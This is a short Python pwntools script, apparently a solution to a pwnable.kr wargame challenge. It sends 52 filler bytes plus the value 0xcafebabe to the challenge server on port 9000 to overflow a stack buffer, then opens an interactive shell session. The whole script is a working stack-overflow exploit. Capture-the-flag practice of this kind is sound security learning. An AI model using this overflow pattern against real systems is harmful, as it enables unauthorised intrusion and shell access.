#!/usr/bin/python
from pwn import *

#context(arch = 'i386',os='linux')

r = remote("pwnable.kr","9000")

key = 0xcafebabe
payload = "A" * 52 + p32(key)

r.send(payload)
r.interactive()

